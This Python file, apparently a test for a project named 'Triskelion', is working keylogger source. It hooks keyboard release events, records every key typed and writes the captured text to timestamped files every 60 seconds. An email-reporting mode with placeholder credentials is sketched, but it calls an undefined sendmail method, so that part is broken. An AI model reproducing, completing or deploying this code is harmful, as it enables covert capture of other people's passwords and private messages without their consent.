#This is to test out the first funtionality of Triskelion - Capturing keystrokes.

import keyboard  # for capturing keystrokes
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Variable initialization
SEND_REPORT_EVERY = 60  # send logs every 60 seconds
EMAIL_ADDRESS = "your_email@example.com"  # your email address
EMAIL_PASSWORD = "your_password"  # your email password

# The actual keylogger class with various methods to undertake various tasks
class Keylogger:
    def __init__(self, interval, report_method="file"):
        # have intervals and use the variable for SEND_REPORT_EVERY
        self.interval = interval
        self.report_method = report_method
        # string variable for the logs of the keystrokes within the self.interval
        self.log = ""
        # record the datetimes for the start and end
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""

    # function to handle the key_up events to check when a key is released on the keyboard
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character nor a special key
            if name == "space":
                name = " "  # representing space
            elif name == "enter":
                name = "[ENTER]\n"  # to add a newline when the enter key is pressed
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")  # replace spaces with underscores for clarity
                name = f"[{name.upper()}]"

        self.log += name  # add the key name to the global variable self.log

    # function to update the filename based on the time interval
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # function to report the logs to a text file
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:  # create the file
            # write the logs to the file
            print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

    # function to report the logs based on the report method
    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    # function to start the keylogger
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # initialize the keylogger to begin writing the logs and reporting to the file
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
